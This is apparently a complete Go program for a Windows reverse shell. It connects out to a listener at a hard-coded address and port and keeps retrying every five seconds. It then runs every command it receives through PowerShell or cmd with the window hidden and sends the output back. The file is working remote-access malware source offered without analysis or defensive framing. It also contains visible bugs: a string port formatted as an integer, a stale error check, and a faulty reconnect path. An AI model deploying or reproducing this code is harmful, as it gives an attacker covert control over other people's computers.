package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"time"
)

func main() {
	var terminal = ""
	//ipaddr := flag.String("a","127.0.0.1","ip")
	ipaddr := "127.0.0.1"
	//port := flag.Int("p",1234,"port")
	port := "1234"
	//term := flag.String("t","p","Cmd/Powershell")
	term := "p"
	flag.Parse()
	address := fmt.Sprintf("%s:%d",ipaddr, port)
	//chose witch terminal to use
	switch term {
	case "cmd":
		terminal = "cmd"
	case "pwsh":
		terminal = "powershell"
	default:
		terminal = "powershell"
	}
	reverse(address,terminal)
}

func reverse(host string,term string) {
	//Connect to the listener
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
		}
		//Try to reconnect every 5 sec
		time.Sleep(5*time.Second)
		reverse(host,term)
	}
	fmt.Println("Connected... :)")

	r := bufio.NewReader(c)
	for {
		//Print path and > on the shell
		path, _ := os.Getwd()
		c.Write([]byte(path))
		c.Write([]byte(">"))

		//Read remote input
		cmd, _ := r.ReadString('\n')
		if nil != err {
			c.Close()
			fmt.Println("Closed... :(")
			return
		}
		//Remove the "\n"
		cmd = strings.TrimSuffix(cmd,"\n")
		args := strings.Split(cmd, " ")
		//Get the home dir
		usr, _:= user.Current()
		//Custom commands
		switch args[0] {
		case "cd":
			//Go to home directory if command is "cd"
			if len(args) == 1 {
				os.Chdir(usr.HomeDir)
			} else {
				os.Chdir(args[1])
			}
		case "exit":
			//Exit terminal
			c.Close();
			os.Exit(0)
		default:
			cmd := exec.Command(term, "/C", cmd)
			//Hide windows
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			//Read and print output
			out, _ := cmd.CombinedOutput()
			c.Write(out)
		}
	}
}

